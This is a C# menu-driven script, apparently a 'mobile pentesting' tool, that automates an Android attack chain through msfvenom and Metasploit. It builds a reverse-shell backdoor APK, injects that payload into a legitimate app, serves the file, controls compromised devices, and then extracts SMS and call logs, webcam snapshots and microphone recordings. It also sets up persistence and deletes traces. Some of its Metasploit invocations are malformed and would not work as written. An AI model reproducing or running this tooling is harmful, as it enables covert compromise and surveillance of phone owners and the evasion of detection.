// Mobile Penetration Testing Automation Script
// Author: Muhammad Sudais Usmani
// Description: This script automates various tasks related to mobile pentesting.

using System;
using System.Diagnostics;

class MobilePentestAutomation
{
    static void RunCommand(string command)
    {
        Console.WriteLine("[+] Executing: " + command);
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "/bin/bash",
            Arguments = "-c \"" + command + "\"",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        Process process = new Process { StartInfo = psi };
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        Console.WriteLine(output);
    }

    static void CheckADB()
    {
        RunCommand("adb devices");
        RunCommand("adb connect 192.168.170.101:5555");
    }

    static void AdbShellAccess()
    {
        RunCommand("adb shell");
    }

    static void GeneratePayload()
    {
        RunCommand("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o backdoor.apk");
    }

    static void InjectPayload()
    {
        Console.Write("Enter path to original APK: ");
        string originalAPK = Console.ReadLine();
        string command = $"msfvenom -x {originalAPK} -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o infected_app.apk";
        RunCommand(command);
    }

    static void StartHTTPServer()
    {
        RunCommand("python3 -m http.server 8080 &");
    }

    static void StartMSFListener()
    {
        RunCommand("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.130.129; set LPORT 443; exploit'");
    }

    static void ControlDevice()
    {
        RunCommand("msfconsole -q -x 'sessions'");
        Console.Write("Enter session ID to interact with: ");
        string sessionID = Console.ReadLine();
        string command = $"msfconsole -q -x 'sessions -i {sessionID}'";
        RunCommand(command);
    }

    static void ExtractData()
    {
        RunCommand("msfconsole -q -x 'dump_calllog'");
        RunCommand("msfconsole -q -x 'dump_sms'");
        RunCommand("msfconsole -q -x 'webcam_snap'");
        RunCommand("msfconsole -q -x 'record_mic 10'");
    }

    static void MaintainAccess()
    {
        RunCommand("msfconsole -q -x 'run persistence -A'");
    }

    static void ClearTraces()
    {
        RunCommand("adb shell rm /sdcard/backdoor.apk");
    }

    static void Main()
    {
        while (true)
        {
            Console.WriteLine("\n[ Mobile Pentesting Automation ]");
            Console.WriteLine("1) Check ADB Connection");
            Console.WriteLine("2) Gain ADB Shell Access");
            Console.WriteLine("3) Generate Malicious APK");
            Console.WriteLine("4) Inject Payload into APK");
            Console.WriteLine("5) Start HTTP Server for Deployment");
            Console.WriteLine("6) Start Metasploit Listener");
            Console.WriteLine("7) Control Compromised Device");
            Console.WriteLine("8) Extract Data from Target");
            Console.WriteLine("9) Maintain Access");
            Console.WriteLine("10) Clear Traces");
            Console.WriteLine("11) Exit");
            Console.Write("Choose an option: ");
            
            if (!int.TryParse(Console.ReadLine(), out int choice))
            {
                Console.WriteLine("Invalid input, please enter a number.");
                continue;
            }
            
            switch (choice)
            {
                case 1:
                    CheckADB();
                    break;
                case 2:
                    AdbShellAccess();
                    break;
                case 3:
                    GeneratePayload();
                    break;
                case 4:
                    InjectPayload();
                    break;
                case 5:
                    StartHTTPServer();
                    break;
                case 6:
                    StartMSFListener();
                    break;
                case 7:
                    ControlDevice();
                    break;
                case 8:
                    ExtractData();
                    break;
                case 9:
                    MaintainAccess();
                    break;
                case 10:
                    ClearTraces();
                    break;
                case 11:
                    Console.WriteLine("Exiting...");
                    return;
                default:
                    Console.WriteLine("Invalid option, please try again.");
                    break;
            }
        }
    }
}
